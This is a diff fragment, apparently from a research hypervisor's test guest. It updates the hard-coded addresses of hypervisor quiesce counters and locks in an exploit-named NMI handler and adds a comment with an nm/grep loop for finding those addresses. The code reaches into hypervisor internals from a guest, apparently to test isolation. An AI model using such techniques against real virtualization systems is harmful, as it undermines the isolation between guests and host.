@@ -125,11 +125,16 @@ void lhv_exploit_vmxroot(VCPU *vcpu)
 
 void lhv_exploit_nmi_handler(VCPU *vcpu)
 {
-	volatile u32 *p_quiesce_counter             = (volatile u32 *)0x1025d104UL;
-	volatile u32 *p_lock_quiesce_counter        = (volatile u32 *)0x1025d108UL;
-	volatile u32 *p_quiesce_resume_counter      = (volatile u32 *)0x1025d10cUL;
-	volatile u32 *p_lock_quiesce_resume_counter = (volatile u32 *)0x1025d110UL;
-	volatile u32 *p_quiesce_resume_signal       = (volatile u32 *)0x1025d11cUL;
+/* Use this shell script:
+for i in g_vmx_{{{,lock_}quiesce,{,lock_}quiesce_resume}_counter,quiesce_resume_signal}; do
+	nm xmhf/src/xmhf-core/xmhf-runtime/runtime.exe | grep $i
+done
+ */
+	volatile u32 *p_quiesce_counter             = (volatile u32 *)0x10247104UL;
+	volatile u32 *p_lock_quiesce_counter        = (volatile u32 *)0x10247108UL;
+	volatile u32 *p_quiesce_resume_counter      = (volatile u32 *)0x1024710cUL;
+	volatile u32 *p_lock_quiesce_resume_counter = (volatile u32 *)0x10247110UL;
+	volatile u32 *p_quiesce_resume_signal       = (volatile u32 *)0x1024711cUL;
 	/* Copy the logic from xmhf_smpguest_arch_x86vmx_nmi_check_quiesce() */
 	spin_lock(p_lock_quiesce_counter);
 	(*p_quiesce_counter)++;
